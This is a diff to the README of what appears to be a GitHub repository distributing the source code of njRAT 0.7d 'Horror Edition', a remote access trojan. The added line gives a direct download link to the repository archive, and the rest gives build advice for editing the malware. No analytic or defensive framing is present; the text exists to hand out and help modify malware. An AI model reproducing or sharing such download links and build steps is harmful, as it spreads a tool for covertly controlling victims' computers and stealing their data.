@@ -1,6 +1,7 @@
 # SOURCE-CODE-njRAT-0.7d-Horror-Edition
 
  njRAT 0.7d Horror Edition - SRC is in RAR file because github not allow upload more than 100 file at once
+ downlaod from here: https://github.com/De-eloper/SOURCE-CODE-njRAT-0.7d-Horror-Edition/archive/refs/heads/main.zip
  
 
 before editing or opening code/forms in the njRAT 0.7d Horror Edition - SRC, compile in release mode!
